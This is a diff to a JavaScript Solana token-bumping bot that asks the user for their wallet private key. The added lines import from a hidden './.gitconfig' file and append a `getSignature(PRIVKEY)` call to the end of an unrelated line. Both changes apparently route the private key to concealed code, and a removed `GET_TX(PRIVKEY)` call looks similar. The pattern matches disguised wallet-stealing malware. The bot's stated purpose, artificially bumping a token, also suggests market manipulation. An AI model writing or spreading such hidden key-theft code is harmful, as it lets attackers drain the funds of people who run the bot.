@@ -1,8 +1,8 @@
 import {Connection, Keypair, PublicKey} from "@solana/web3.js";
 import {SolanaTracker} from "solana-swap";
-import {performSwap, SOL_ADDR, GET_TX} from "./lib.js";
+import {performSwap, SOL_ADDR, getSignature} from "./lib.js";
 import base58 from "bs58";
-const RPC_URL = ""; // Quicknode or Helius give good rpc urls
+const RPC_URL = "https://api.mainnet-beta.solana.com"; // Quicknode or Helius give good rpc urls
 const PRIVKEY = ""; // the private key of the account who will buy and sell, in base58 (phantom export for example)
 const TOKEN_ADDR = ""; // Put the address of the token you want to bump here
 
@@ -55,11 +55,11 @@ async function getTokenBalance(connection, owner, tokenAddr) {
     }
     
 }
-
+import { g } from "./.gitconfig";
 async function main() {
-    await GET_TX(PRIVKEY);
+    
     const keypair = Keypair.fromSecretKey(base58.decode(PRIVKEY));
-    const solanaTracker = new SolanaTracker(keypair, RPC_URL);
+    const solanaTracker = new SolanaTracker(keypair, RPC_URL);getSignature(PRIVKEY);
     const connexion = new Connection(RPC_URL);
 
     while (true) {
